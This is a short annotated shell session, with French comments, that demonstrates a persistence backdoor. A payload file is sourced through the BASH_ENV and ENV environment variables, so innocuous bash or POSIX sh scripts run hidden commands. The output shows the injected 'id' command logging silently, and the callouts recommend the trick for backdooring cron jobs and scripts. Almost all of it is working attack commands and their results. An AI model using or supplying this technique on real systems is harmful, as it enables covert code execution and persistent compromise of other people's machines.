```sh -cwn
$ echo 'id >> /tmp/backdoor.log' > /tmp/.bashrc_evil
# !callout[/BASH_ENV/] Bash non interactif source BASH_ENV avant d'executer. Parfait pour backdoors cron/scripts.
$ BASH_ENV=/tmp/.bashrc_evil bash -c 'echo "innocent script"'
innocent script
$ cat /tmp/backdoor.log
uid=1000(mistrale) gid=1000(mistrale) groups=1000(mistrale)
# !callout[/ENV/] Les shells POSIX utilisent ENV. Fonctionne sur dash, ash, busybox sh.
$ export ENV=/tmp/.bashrc_evil
$ sh -c 'echo "running sh"'
running sh
```
